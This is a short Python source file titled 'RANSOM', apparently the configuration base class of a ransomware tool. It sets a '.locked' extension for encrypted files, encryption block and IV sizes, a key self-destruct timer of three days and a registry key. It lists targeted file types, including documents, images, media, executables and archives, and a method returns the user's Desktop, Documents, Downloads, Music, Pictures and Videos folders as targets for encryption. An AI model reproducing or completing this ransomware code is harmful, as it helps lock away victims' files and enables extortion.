## RANSOM
## Base class
## author mls

# Import libs
import os

# Import classes

################
## Base class ##
################
class Base():
    # Init base object

    # SCHEMA
    ENCRYPTED_EXTENSION = ".locked"
    BLOCK_SIZE_BYTES = 8192
    IV_SIZE = 16
    PADDING_BLOCK_SIZE = 16
    MAX_FILE_SIZE_BYTES = 536870912
    KEY_DESTRUCT_TIME_SECONDS = 259200
    REGISTRY_LOCATION = r"SOFTWARE\\Crypter"

    FILETYPES = [
                # GENERAL FORMATS
                "sln",

                # IMAGE FORMATS
                "jpg", "png",

                # VIDEO FORMATS
                "mp4", "avi", "mkv",

                # DOCUMENT FORMATS
                "doc", "docx", "txt", "pdf",

                # SOUND FORMATS
                "mp3",

                # EXE FORMATS
                "exe", "msi", "php",

                # COMPRESSION FORMATS
                "tgz", "zip", "rar"
                ]

    def get_base_dirs(self, home_dir):
      # Function to return a list of base directories to encrypt
      # TODO Detect presence of network drives
      # TODO Improve overall functionality for getting list of locations to encrypt

      base_dirs = [
                    os.path.join(home_dir, "Desktop"),
                    os.path.join(home_dir, "Documents"),
                    os.path.join(home_dir, "Downloads"),
                    os.path.join(home_dir, "Music"),
                    os.path.join(home_dir, "Pictures"),
                    os.path.join(home_dir, "Videos")
                  ]

      return base_dirs

